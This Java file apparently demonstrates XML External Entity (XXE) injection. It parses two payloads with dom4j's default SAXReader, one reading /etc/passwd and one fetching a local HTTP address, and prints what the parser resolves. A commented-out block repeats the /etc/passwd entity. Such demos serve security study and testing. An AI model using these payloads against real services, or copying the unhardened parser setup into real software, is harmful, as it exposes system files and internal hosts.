package com.xiongyingqi.xml;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Iterator;
import java.util.Map;
import java.util.TreeMap;

/**
 * @author qi
 * @since 2018/7/9
 */
public class XXE {
    private static final String XXE_STRING =
            "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<!DOCTYPE bar [\n" +
                    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                    "]>\n" +
                    "<x>&xxe;</x>\n";
    private static final String XXE_CMD_STRING =
            "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
                    "<!DOCTYPE ANY [\n" +
                    "<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\">\n" +
                    "]>\n" +
                    "<x>&xxe;</x>";

    public static void sax(String xml) {
        SAXReader reader = new SAXReader();
        try {
            ByteArrayInputStream inputStream = new ByteArrayInputStream(xml.getBytes());
            Document read = reader.read(inputStream);
            System.out.println("read====" + read);
            Element rootElement = read.getRootElement();
            System.out.println("root: " + rootElement.getStringValue());
        } catch (DocumentException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws DocumentException {
        sax(XXE_STRING);
        sax(XXE_CMD_STRING);


//        Map<String, String> params = new TreeMap<String, String>();
//        try {
//            Document document = DocumentHelper.parseText("<?xml version=\"1.0\"?>\n" +
//                    "<!ENTITY b SYSTEM \"file:///etc/passwd\">\n" +
//                    "<x>&xxe;</x>");
//            Element e = document.getRootElement();
//            System.out.println(e);
////            @SuppressWarnings("unchecked")
////            Iterator<Element> iter = e.elementIterator();
////            while (iter.hasNext()) {
////                Element ele = iter.next();
////                params.put(ele.getName(), ele.getData().toString());
////            }
//        } catch (DocumentException e1) {
//            e1.printStackTrace();
//        }
//
//        System.out.println(params);
    }
}
